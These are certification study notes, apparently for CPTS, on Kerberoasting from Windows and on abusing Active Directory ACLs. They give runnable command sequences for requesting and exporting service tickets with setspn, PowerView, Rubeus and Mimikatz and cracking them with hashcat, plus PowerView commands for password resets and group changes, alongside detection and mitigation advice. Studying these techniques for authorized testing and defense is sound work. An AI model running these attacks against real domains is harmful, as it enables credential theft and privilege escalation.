- **Success is Not Guaranteed:** Cracking a TGS ticket can be time-consuming and may fail if the service account has a strong password. The value of a cracked password depends entirely on the privileges of that service account.
- **Reporting:** Even if you can't crack a ticket, the existence of SPNs with weak password policies is a valid security finding. The risk level (High vs. Medium) depends on whether you successfully compromised an account.


# Kerberoasting From Windows - CPTS Study Notes

> Use only in authorized lab environments such as HTB or systems where you have explicit permission to test.

## What Kerberoasting Is

Kerberoasting is an Active Directory attack technique that targets service accounts with Service Principal Names (SPNs). An authenticated domain user can request Kerberos TGS tickets for these services. The ticket material can then be exported and tested offline against candidate passwords.

## Key Workflow

1. Enumerate SPNs in the domain.
2. Identify user-backed service accounts and ignore ordinary computer accounts where appropriate.
3. Request TGS tickets for selected SPNs.
4. Extract or export the tickets.
5. Convert tickets into a format supported by a password-auditing tool.
6. Test the tickets offline against candidate passwords.
7. Validate any recovered credentials and document the resulting access.

## Semi-Manual Method

### 1. Enumerate SPNs with `setspn.exe`

```cmd
setspn.exe -Q */*
```

This returns SPNs registered throughout the domain. Focus on SPNs associated with user service accounts rather than computer accounts.

### 2. Request a Ticket for One SPN

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

`Add-Type` loads the required .NET assembly. `KerberosRequestorSecurityToken` requests a TGS for the supplied SPN and places it in the current logon session.

### 3. Request Tickets from Enumerated SPNs

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

This is less selective because it also requests tickets for computer-backed SPNs.

### 4. Export Cached Tickets with Mimikatz

```text
base64 /out:true
kerberos::list /export
```

With Base64 output enabled, Mimikatz prints each exported ticket as a Base64 blob. Without it, `kerberos::list /export` writes `.kirbi` files to disk.

### 5. Rebuild a `.kirbi` File from Base64

Remove line breaks from the copied blob:

```bash
echo "<base64_blob>" | tr -d '\n'
```

Save the single-line output in a file, then decode it:

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

### 6. Convert the Ticket

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

The version used in the module creates a file named `crack_file`. Convert its output to the expected etype 23 format:

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*\$\2/' crack_file > sqldev_tgs_hashcat
```

### 7. Test an RC4 Ticket Offline

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

Hashcat mode `13100` is used for Kerberos 5 TGS-REP etype 23, or RC4.

## PowerView Method

### Import PowerView and Enumerate SPN Users

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

### Request a Ticket for One User

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

### Export All Results to CSV

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

PowerView can output TGS material directly in Hashcat format, avoiding the `.kirbi` conversion process.

## Rubeus Method

### Show Kerberoastable Account Statistics

```powershell
.\Rubeus.exe kerberoast /stats
```

This lists useful information without requesting tickets, including the number of accounts, supported encryption types, and password-last-set years.

### Target One User

```powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

### Write Results to a File

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

### Limit Results with an LDAP Filter

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

`/nowrap` keeps output on one line, which makes it easier to save for offline testing. An `admincount=1` filter can identify potentially high-value accounts, but the attribute is not definitive proof that an account is currently privileged.

### Other Options Mentioned in the Section

- `/stats`: List statistics without sending ticket requests.
- `/user:USER`: Select one account.
- `/spn:"service/host"`: Select one SPN.
- `/outfile:FILE`: Save output to a file.
- `/simple`: Print file-style output to the console.
- `/creduser` and `/credpassword`: Use alternate credentials.
- `/delay` and `/jitter`: Space out requests.
- `/resultlimit`: Limit the number of results.
- `/aes`: Request AES tickets.
- `/nowrap`: Prevent wrapped output.
- `/tgtdeleg`: In some older environments, request RC4-only service tickets.

## Encryption Types

- **RC4, etype 23:** Hashes commonly begin with `$krb5tgs$23$`. They are substantially faster to test offline.
- **AES128, etype 17:** Stronger and slower to test.
- **AES256, etype 18:** Hashes begin with `$krb5tgs$18$` and are substantially slower to test than RC4.

Check an account's configured encryption types with PowerView:

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

In the module examples:

- `msDS-SupportedEncryptionTypes = 0` means no explicit type is defined and RC4 is used by default in that setup.
- `msDS-SupportedEncryptionTypes = 24` indicates AES128 and AES256 support.

Use Hashcat mode `19700` for an AES256 TGS-REP:

```bash
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

The section notes that the `/tgtdeleg` RC4 downgrade behavior does not work against Windows Server 2019 domain controllers in the demonstrated scenario. Such controllers return a ticket using the strongest encryption type supported by the target account.

## Detection

Enable **Audit Kerberos Service Ticket Operations** on domain controllers and monitor:

- **Event ID 4769:** A Kerberos service ticket was requested.
- **Event ID 4770:** A Kerberos service ticket was renewed.

Possible indicators include:

- Many TGS requests from one account in a short period.
- Requests for numerous service accounts in rapid succession.
- Unexpected RC4 ticket requests, shown as ticket encryption type `0x17` in the module example.

Normal request volume depends on the environment, so detections should use an established baseline rather than a universal fixed threshold.

## Mitigation

- Use long, random passwords or passphrases for traditional service accounts.
- Prefer Managed Service Accounts and Group Managed Service Accounts.
- Rotate service-account passwords regularly.
- Avoid assigning SPNs to highly privileged accounts.
- Restrict RC4 where compatibility testing shows it is safe.
- Monitor Event IDs 4769 and 4770 for anomalies.
- Test encryption-policy changes before deployment because disabling an encryption type can break legacy services.

# Access Control List (ACL) Abuse Primer

> Use only in authorized labs and assessments. Some ACL operations modify Active Directory and can be destructive.

## Core Concepts

An **Access Control List (ACL)** defines:

1. Which security principal can access an object.
2. What level of access that principal has.

A security principal can be a **user, group, computer, or process**. Every Active Directory object has an ACL containing one or more **Access Control Entries (ACEs)**.

A small ACL misconfiguration can give an unintended principal control over users, groups, computers, or other AD objects. This may enable lateral movement, privilege escalation, or persistence.

## ACL Types

### DACL: Discretionary Access Control List

Defines which principals are **allowed or denied** access to an object.

- A missing DACL grants full access to everyone.
- An existing but empty DACL denies access to everyone.
- DACLs contain allow and deny ACEs.

### SACL: System Access Control List

Defines which access attempts should be audited. SACL entries generate security logs when specified operations are attempted.

## ACE Types

- **Access allowed ACE:** explicitly grants access.
- **Access denied ACE:** explicitly denies access.
- **System audit ACE:** records access attempts through the SACL.

Each ACE contains:

1. The SID of the user or group.
2. The ACE type: allow, deny, or audit.
3. Inheritance flags for child objects.
4. A 32-bit access mask defining the granted rights.

ACL entries are evaluated in order. Explicit deny entries can override otherwise granted access, so ACE order and inheritance matter.

## Important AD Rights

### ForceChangePassword

Allows the principal to reset a target user's password without knowing the current password.

Associated PowerView command:

```powershell
Set-DomainUserPassword
```

Use cautiously because resetting a password can disrupt services or user access.

### Add Members

Allows the principal to add users to a group.

```powershell
Add-DomainGroupMember
```

This becomes dangerous when the target group is privileged or provides access to sensitive resources.

### GenericAll

Provides full control over the target object.

Depending on the object type, it may allow password resets, group-membership changes, attribute modification, targeted Kerberoasting, or access to attributes such as a LAPS-managed password.

```powershell
Set-DomainUserPassword
Add-DomainGroupMember
```

### GenericWrite

Allows modification of non-protected attributes on an object.

```powershell
Set-DomainObject
```

Possible impact depends on the object:

- **User:** modify attributes, potentially including assigning an SPN.
- **Group:** modify group-related attributes or membership where permitted.
- **Computer:** may expose delegation-related attack paths.

### WriteOwner

Allows changing the owner of an object.

```powershell
Set-DomainObjectOwner
```

Object owners can normally modify the object's permissions, making this an indirect path to greater control.

### WriteDACL

Allows modification of the target object's DACL.

```powershell
Add-DomainObjectACL
```

This can be used to grant another principal additional rights over the object.

### AllExtendedRights

Grants all extended rights on the target object. Depending on the object, this may include password-reset or group-management capabilities.

```powershell
Set-DomainUserPassword
Add-DomainGroupMember
```

### AddSelf

Allows a user to add their own account to a specific group.

```powershell
Add-DomainGroupMember
```

## Main Rights Covered in the Module

The module focuses on four ACEs:

1. **ForceChangePassword:** reset a user's password without knowing it.
2. **GenericWrite:** modify non-protected object attributes.
3. **AddSelf:** add the controlled account to an allowed group.
4. **GenericAll:** obtain full control over the target object.

Always interpret a right in relation to its **target object type**. The same permission can have different effects over a user, group, or computer.

## Enumeration and Visualization

Useful tools include:

- **BloodHound:** visualizes relationships and ACL attack paths as graph edges.
- **PowerView:** enumerates permissions and provides commands for authorized AD testing.
- **Active Directory Users and Computers (ADUC):** displays permissions graphically under Advanced Security Settings.
- **Auditing tab in ADUC:** displays SACL entries.

When reviewing an ACE, identify:

```text
Principal -> ACE type -> Inheritance -> Granted right -> Target object
```

Also check whether control is inherited, directly assigned, or obtained through group membership.

## Other Interesting Rights

Less common BloodHound edges and AD extended rights may also expose attack paths, for example:

- **ReadGMSAPassword:** permits reading a gMSA-managed password.
- **Unexpire-Password:** permits removing password expiration state.
- **Reanimate-Tombstones:** permits restoring deleted AD objects.

The correct methodology is to identify the controlled principal, target object, exact right, inheritance scope, and possible impact before taking action.

## Common Real-World Scenarios

### Password-reset delegation

Help Desk personnel commonly receive password-reset rights. Compromising such an account may expose other users whose passwords it is authorized to reset.

### Group-membership management

An account may be allowed to add or remove group members. The impact depends on what privileges or resource access the target group provides.

### Excessive or forgotten rights

Legacy configurations, software installations, troubleshooting changes, and accidental delegation may leave users or groups with unnecessary control over AD objects.

## Assessment Safety

ACL abuse may change passwords, group memberships, ownership, attributes, or permissions. These actions can interrupt services or lock out users.

Before making changes:

1. Confirm the action is in scope and authorized.
2. Record the original object state.
3. Prefer the least disruptive validation method.
4. Document every modification.
5. Revert all changes after testing.
6. Clearly report what was changed and how it was restored.

```text
AddSelf             Add yourself to an allowed group
BloodHound          Visualize ACL relationships
PowerView           Enumerate and test AD permissions
Main outcomes       Lateral movement, privilege escalation, persistence
```

## Exam Takeaway

For every ACL finding, determine **who controls what, through which ACE, over which target type, and with what inheritance**. ACL paths are often missed by vulnerability scanners, so BloodHound, PowerView, and manual AD inspection are important for finding unintended privilege relationships.
